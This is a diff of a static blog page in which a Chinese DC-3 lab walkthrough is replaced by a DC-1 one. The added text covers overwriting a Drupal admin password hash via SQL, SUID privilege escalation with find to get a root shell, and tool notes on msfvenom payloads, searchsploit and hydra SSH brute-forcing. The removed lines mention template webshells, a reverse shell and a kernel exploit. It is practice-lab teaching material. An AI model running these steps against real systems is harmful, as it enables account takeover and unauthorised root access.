+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909162734376.png"
+                      alt="image-20230909162734376"
+                ></p>
+<p>进入drupaldb数据库，查看表</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909163008070.png"
+                      alt="image-20230909163008070"
+                ></p>
+<p>查看里面的数据</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909163130086.png"
+                      alt="image-20230909163130086"
+                ></p>
+<p>在这里面我们可以找到</p>
+<p>在这里面我们可以找到管理员的账号密码</p>
+<p>但是密码是被加密了</p>
+<p>看网上师傅的wp说是drupal存在加密脚本</p>
+<p>我们可以用加密脚本加密一个我们自己设置的密码，然后把这个管理员密码替换掉</p>
+<p>加密脚本文件路径在&#x2F;var&#x2F;www&#x2F;scripts&#x2F;password-hash.sh。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php /var/www/scripts/password-hash.sh 123456789</span><br></pre></td></tr></table></figure></div>
 
-<p>尝试登录后台</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205056490.png"
-                     
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909164443711.png"
+                      alt="image-20230909164443711"
                 ></p>
-<p>成功登录后台管理页面</p>
+<p>那我们后面就可以进行密码替换了</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users set pass = &quot;$S$D8yKKKzqsc2R.PZyfXmrY/R//m.mDetlFB3DU/D3srEPHqfCtyi/&quot; where name =&#x27;admin&#x27;;</span><br></pre></td></tr></table></figure></div>
+
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205218049.png"
-                      alt="image-20230908205218049"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909164733153.png"
+                      alt="image-20230909164733153"
                 ></p>
-<p>在后台中我们可以修改模板页面的代码</p>
+<p>然后我们这里已经成功把密码替换成我们自己设置的</p>
+<p>然后我们直接去登录页面登录就行了</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205307778.png"
-                      alt="image-20230908205307778"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909165101345.png"
+                      alt="image-20230909165101345"
                 ></p>
-<p>那我们可以尝试在模板页面中写入phpinfo看看是否可用</p>
+<p>成功登录进来，而且我们也发现了flag3的位置</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230908205403689.png"
-                      alt="image-20230908205403689"
-                ></p>
-<p>访问修改的模板页面</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205554965.png"
-                      alt="image-20230908205554965"
-                ></p>
-<p>可以看到成功利用了</p>
-<p>那我们这里可以在模板页面中写入反弹shell代码，从而连接上服务器</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205652193.png"
-                      alt="image-20230908205652193"
-                ></p>
-<p>或者直接写入一句话木马</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205710976.png"
-                      alt="image-20230908205710976"
-                ></p>
-<p>尝试蚁剑连接</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205735037.png"
-                      alt="image-20230908205735037"
-                ></p>
-<p>反弹shell</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205758952.png"
-                      alt="image-20230908205758952"
-                ></p>
-<p>监听端口</p>
-<p>访问我们修改的页面</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205841726.png"
-                      alt="image-20230908205841726"
-                ></p>
-<p>反弹shell成功</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205857858.png"
-                      alt="image-20230908205857858"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909165214519.png"
+                      alt="image-20230909165214519"
                 ></p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908205913820.png"
-                      alt="image-20230908205913820"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909165307393.png"
+                      alt="image-20230909165307393"
                 ></p>
-<p>可以看到我们当前是普通用户权限</p>
-<p>查看liunx内核版本</p>
+<p>根据提示查看etc&#x2F;passwd</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908210019246.png"
-                      alt="image-20230908210019246"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909165341004.png"
+                      alt="image-20230909165341004"
                 ></p>
-<p>4.4的内核不能利用脏牛提权</p>
+<p>flag4在home目录下</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909165806415.png"
+                      alt="image-20230909165806415"
+                ></p>
+<p>需要提权到root权限才可以</p>
 <p>尝试suid提权</p>
-<p>查看有s权限的命令</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find -perm -u=s -type f -exec ls -la &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure></div>
+<h1 id="四、提权"><a href="#四、提权" class="headerlink" title="四、提权"></a>四、提权</h1><p>查看所有有s标识为的命令</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure></div>
 
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908210223367.png"
-                      alt="image-20230908210223367"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909170505396.png"
+                      alt="image-20230909170505396"
                 ></p>
-<p>没有有s权限的命令</p>
-<p>那就只能看看有没有root权限的命令了</p>
+<p>有很多命令都有s标识位</p>
+<p>这里尝试使用find提权</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908210303889.png"
-                      alt="image-20230908210303889"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909170723993.png"
+                      alt="image-20230909170723993"
                 ></p>
-<p>同样的也是没有</p>
-<p>那这种情况下我们只能去通过searchsploit查找相应的liunx版本是否存在提权漏洞</p>
-<p>那我们首先要先获取到系统的版本号和内核版本号</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/issue		//查看系统版本号</span><br><span class="line">uname -a			//查看内核版本号</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>尝试使用root执行命令</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find `which find` -exec whoami \;</span><br></pre></td></tr></table></figure></div>
 
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908210524256.png"
-                      alt="image-20230908210524256"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909170820781.png"
+                      alt="image-20230909170820781"
                 ></p>
-<p>系统为 <code>ubuntu 16.04</code>，内核发行版本为 <code>4.4.0-21</code></p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit ubuntu 16.04</span><br></pre></td></tr></table></figure></div>
+<p>提权</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -exec /bin/bash -p \;</span><br></pre></td></tr></table></figure></div>
 
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908210745836.png"
-                      alt="image-20230908210745836"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909171428691.png"
+                      alt="image-20230909171428691"
                 ></p>
-<p>找到对应内核版本的漏洞</p>
-<p>有三个漏洞可以利用</p>
-<p>这里使用Linux Kernel 4.4.x (Ubuntu 16.04) - ‘double-fdput()’ bpf(BPF_PROG_LOAD) Privilege Escalation这个漏洞来打</p>
-<p>同样的先把exp下载到kali上</p>
+<p>可以看到提权成功</p>
+<p>进入后面home查看flag4</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908211034760.png"
-                      alt="image-20230908211034760"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909171717246.png"
+                      alt="image-20230909171717246"
                 ></p>
-<p>打开可以看到exp的下载网址</p>
+<h1 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h1><p>这台靶机主要是学习了一下漏洞扫描和里利用工具的使用</p>
+<h2 id="whatweb指纹识别"><a href="#whatweb指纹识别" class="headerlink" title="whatweb指纹识别"></a>whatweb指纹识别</h2><p>安装：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install whatweb</span><br></pre></td></tr></table></figure></div>
+
+<p>kali中自带的有</p>
+<p>参数：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">h 查看帮助信息</span><br><span class="line">--version 查看版本信息</span><br><span class="line">-i 指定要扫描的文件</span><br><span class="line">-v 详细显示扫描的结果</span><br><span class="line">-a 指定运行级别</span><br></pre></td></tr></table></figure></div>
+
+<p> 所有参数：<br> 使用添加whatweb -h查看所有参数</p>
+<p>常规扫描：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb url</span><br></pre></td></tr></table></figure></div>
+
+<p>批量扫描</p>
+<p>将url全部写入一个txt中，然后使用-i参数指定文件就可以了</p>
+<p>扫描结果显示详细内容</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb -v ip</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="msfconsole漏洞扫描利用"><a href="#msfconsole漏洞扫描利用" class="headerlink" title="msfconsole漏洞扫描利用"></a>msfconsole漏洞扫描利用</h2><p>安装：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install metasploit-framework #kali自带的有</span><br></pre></td></tr></table></figure></div>
+
+<p>使用方法，终端输入msfconsole</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908211053135.png"
-                      alt="image-20230908211053135"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230909172414215.png"
+                      alt="image-20230909172414215"
                 ></p>
-<p>我们把exp下载下来，然后通过蚁剑传送到服务器上面</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908211156826.png"
-                      alt="image-20230908211156826"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908211221597.png"
-                      alt="image-20230908211221597"
-                ></p>
-<p>解压exploit压缩包进行利用</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908211436246.png"
-                      alt="image-20230908211436246"
-                ></p>
-<p>先执行 <code>complie.sh</code>，然后执行 <code>doubleput</code></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908211653792.png"
-                      alt="image-20230908211653792"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908211714171.png"
-                      alt="image-20230908211714171"
-                ></p>
-<p>这里显示已经提权成功</p>
-<p>查看我们当前的权限</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908211747289.png"
-                      alt="image-20230908211747289"
-                ></p>
-<p>可以看到我们已经提升到了root权限</p>
-<p>下面获取flag就行了</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230908211833124.png"
-                      alt="image-20230908211833124"
-                ></p>
-<h1 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h1><p>这台靶机相对来说比较简单，更多的是学习渗透的流程和工具的使用，在这个靶机中大多数利用的漏洞都是通过searchsploit在漏洞库中进行检索利用的。</p>
+<p><strong>msf控制台参数运用</strong></p>
+<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- banner #这个主要是查看metasploit的版本信息，利用模块数量、payload数量等等。 </span><br><span class="line">- use #这个是使用参数。如你要使用到某个利用模块，payload等，那么就要使用到use参数 </span><br><span class="line">- Search #当你使用msfconsole的时候，你会用到各种漏洞模块、各种插件等等。所以search命令就很重要。   使用命令 `help search` 可以查看具体使用方法；   其他使用方法：   查mysql:`search name:mysql`; 查joomla:`search joomla`;查ubutu漏洞：`searchsploit ubuntu 16.04`；查ms08-067漏洞：`search ms08-067` ...... </span><br><span class="line">- show #这个命令用的很多。如果单纯的输入show，那么就会显示出所有的payload，利用模块，post模块，插件等等。但是一般我们都不这么使用。如果要显示利用模块，那么就输入show exploits。如果要显示payload，那么就输入show payloads。</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>生成payload时常见参数说明：</strong></p>
+<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-p, –payload &lt; payload&gt; 指定需要使用的payload(攻击荷载)。也可以使用自定义payload,几乎是支持全平台的</span><br><span class="line">-l, –list [module_type] 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all</span><br><span class="line"> -n, –nopsled &lt; length&gt; 为payload预先指定一个NOP滑动长度 </span><br><span class="line">-f, –format &lt; format&gt; 指定输出格式 (使用 –help-formats 来获取msf支持的输出格式列表) </span><br><span class="line">-e, –encoder [encoder] 指定需要使用的encoder（编码器）,指定需要使用的编码，如果既没用-e选项也没用-b选项，则输出raw payload </span><br><span class="line">-a, –arch &lt; architecture&gt; 指定payload的目标架构，例如x86 | x64 | x86_64 –platform &lt; platform&gt; 指定payload的目标平台 </span><br><span class="line">-s, –space &lt; length&gt; 设定有效攻击荷载的最大长度，就是文件大小 </span><br><span class="line">-b, –bad-chars &lt; list&gt; 设定规避字符集，指定需要过滤的坏字符例如：不使用 &#x27;\x0f&#x27;、&#x27;\x00&#x27;; -i, –iterations &lt; count&gt; 指定payload的编码次数 </span><br><span class="line">-c, –add-code &lt; path&gt; 指定一个附加的win32 shellcode文件 </span><br><span class="line">-x, –template &lt; path&gt; 指定一个自定义的可执行文件作为模板,并将payload嵌入其中 </span><br><span class="line">-k, –keep 保护模板程序的动作，注入的payload作为一个新的进程运行 </span><br><span class="line">–payload-options 列举payload的标准选项 </span><br><span class="line">-o, –out &lt; path&gt; 指定创建好的payload的存放位置 </span><br><span class="line">-v, –var-name &lt; name&gt; 指定一个自定义的变量，以确定输出格式 </span><br><span class="line">–shellest 最小化生成payload -h, –help 查看帮助选项 </span><br><span class="line">–help-formats 查看msf支持的输出格式列表</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h2><p>使用方法 ：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit 目标名称</span><br></pre></td></tr></table></figure></div>
+
+<p>下载payload：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m exp文件名</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="hydra（ssh爆破工具）"><a href="#hydra（ssh爆破工具）" class="headerlink" title="hydra（ssh爆破工具）"></a>hydra（ssh爆破工具）</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l 用户名 -P /usr/share/wordlists/rockyou.txt.gz ssh://ip</span><br></pre></td></tr></table></figure></div>
+
+<p>-l 指定破解的用户，对特定用户破解，-P 指定密码字典。</p>
+<p>&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz是kali自带的。</p>
 
             </div>
 
@@ -862,16 +820,16 @@
                 <div class="post-copyright-info">
                     <div class="article-copyright-info-container">
     <ul>
-        <li><strong>标题:</strong> DC-3靶机打靶记录</li>
+        <li><strong>标题:</strong> DC-1打靶记录</li>
         <li><strong>作者:</strong> GTL-JU</li>
-        <li><strong>创建于:</strong> 2023-09-08 21:28:46</li>
+        <li><strong>创建于:</strong> 2023-09-09 17:45:17</li>
         
             <li>
-                <strong>更新于:</strong> 2023-09-08 21:29:38
+                <strong>更新于:</strong> 2023-09-09 17:46:10
             </li>
         
         <li>
-            <strong>链接:</strong> https://gtl-ju.github.io/2023/09/08/DC-3打靶记录/
+            <strong>链接:</strong> https://gtl-ju.github.io/2023/09/09/DC-1打靶记录/
         </li>
         <li>
             <strong>版权声明:</strong> 本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a> 进行许可。
@@ -897,29 +855,14 @@
             
                 <div class="article-nav">
                     
-                        <div class="article-prev">
-                            <a class="prev"
-                            rel="prev"
-                            href="/2023/09/09/DC-1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/"
-                            >
-                                <span class="left arrow-icon flex-center">
-                                    <i class="fa-solid fa-chevron-left"></i>
-                                </span>
-                                <span class="title flex-center">
-                                    <span class="post-nav-title-item">DC-1打靶记录</span>
-                                    <span class="post-nav-item">上一篇</span>
-                                </span>
-                            </a>
-                        </div>
-                    
                     
                         <div class="article-next">
                             <a class="next"
                             rel="next"
-                            href="/2023/09/08/zico2%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/"
+                            href="/2023/09/08/DC-3%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/"
                             >
                                 <span class="title flex-center">
-                                    <span class="post-nav-title-item">zico2靶机打靶记录</span>
+                                    <span class="post-nav-title-item">DC-3靶机打靶记录</span>
                                     <span class="post-nav-item">下一篇</span>
                                 </span>
                                 <span class="right arrow-icon flex-center">
@@ -940,8 +883,8 @@
                 <div class="post-toc-wrap">
     <div class="post-toc">
         <div class="toc-title">此页目录</div>
-        <div class="page-title">DC-3靶机打靶记录</div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#DC-3%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95"><span class="nav-text">DC-3靶机打靶记录</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">一、环境搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">二、信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="nav-text">主机发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">端口扫描</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="nav-text">三、漏洞扫描挖掘与利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E6%80%BB%E7%BB%93"><span class="nav-text">四、总结</span></a></li></ol>
+        <div class="page-title">DC-1打靶记录</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E9%9D%B6%E6%9C%BA%E6%90%AD%E5%BB%BA"><span class="nav-text">一、靶机搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">二、信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="nav-text">靶机发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">端口扫描</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="nav-text">三、漏洞扫描与利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E6%8F%90%E6%9D%83"><span class="nav-text">四、提权</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%94%E3%80%81%E6%80%BB%E7%BB%93"><span class="nav-text">五、总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#whatweb%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="nav-text">whatweb指纹识别</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#msfconsole%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%88%A9%E7%94%A8"><span class="nav-text">msfconsole漏洞扫描利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#searchsploit"><span class="nav-text">searchsploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hydra%EF%BC%88ssh%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7%EF%BC%89"><span class="nav-text">hydra（ssh爆破工具）</span></a></li></ol></li></ol>
 
     </div>
 </div>
